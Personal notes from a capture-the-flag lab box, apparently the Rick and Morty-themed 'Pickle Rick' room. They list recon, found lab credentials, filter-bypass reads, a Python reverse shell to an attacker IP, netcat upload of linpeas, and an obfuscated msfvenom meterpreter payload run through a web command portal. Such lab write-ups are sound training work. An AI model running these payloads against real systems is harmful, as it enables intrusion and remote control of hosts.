# 10.10.227.11

```
export id=10.10.227.11 
```
# OS

# services
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))



# Creds
Username: R1ckRul3s - found curling port 80
Wubbalubbadubdub

# Checklist port 80
	- website headers - done
	- manual browse - done
	- Robots.txt (Wubbalubbadubdub)
	-GoBuster the website 
		gobuster dir -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.227.11/
	- Nothing meaningful found

# Checklist port 22


	-check anonymous ssh
	- hydra ssh (target ssh://10.10.227.11:22/ does not support password authentication)




Methodology:

1. port 80 was open.
2. found username in index.html commands
3. found the password in robots.txt
4. found there's a login.php using gobuster
5. login successful to a command portal 
6. ls command worked. but can't cat any files. used different appraoch:
	- while read line; do echo $line; done < filename.txt
	- grep . filename.txt (. is the regular expression for anything)
	- grep -R .  
6a. found the flag using the above technique. 
7. python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.47.37",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
8. get interative shell:
	python3 -c 'import pty; pty.spawn("/bin/bash")' get interatvie shell
9. upload linpeas.sh
	- server: nc -lnvp 4444 > /dev/shm/linpeas.sh
	- client: nc 10.10.226.135 4444 < linpeas.sh
	- close connection on client after sucessful connection. 
	- execute linpeas.sh (chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.log)
	- server: nc -lnvp 4444 < /dev/shm/linpeas.log
	- client: nc 10.10.226.135 4444 > linpeas.log 

10. found the flags in root and rick directories. 

---------------
using msf:

	command: msfvenom -p python/meterpreter/reverse_tcp LHOST=10.6.47.37 LPORT=7777 -f raw 
	output: 

	exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKGrtYXFCiIeRERwvYlIm4wamiYhyWpV/HcbsjiHGd6bN29m9OxdSDg6OUHi30aPfBwitA2PKexl4knPgF5dwAvWFofBvgHd1GyLqhS+1lzFvgyLUugJP+Dd/dXty+7x4fryjmWdkM5akIlSsqlFK5pOnHaEd2uwLBgDDBOqYJHgU3bOq0U0AJ6eMWT6cpHYWz/IiZKLG8KjCCA/aMPYU/2MVH/AhqHPd20AG7BUsXOz2qmj/+5xoRmCBSTNTwsF0s0+QIy0/C/GtsmkgqzkPySSbfxl6A9Dd16m')[0])))


	execute it in the web portal: 

	python3 -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKGrtYXFCiIeRERwvYlIm4wamiYhyWpV/HcbsjiHGd6bN29m9OxdSDg6OUHi30aPfBwitA2PKexl4knPgF5dwAvWFofBvgHd1GyLqhS+1lzFvgyLUugJP+Dd/dXty+7x4fryjmWdkM5akIlSsqlFK5pOnHaEd2uwLBgDDBOqYJHgU3bOq0U0AJ6eMWT6cpHYWz/IiZKLG8KjCCA/aMPYU/2MVH/AhqHPd20AG7BUsXOz2qmj/+5xoRmCBSTNTwsF0s0+QIy0/C/GtsmkgqzkPySSbfxl6A9Dd16m')[0])))"



	in msf, catch the shell using multi/handler











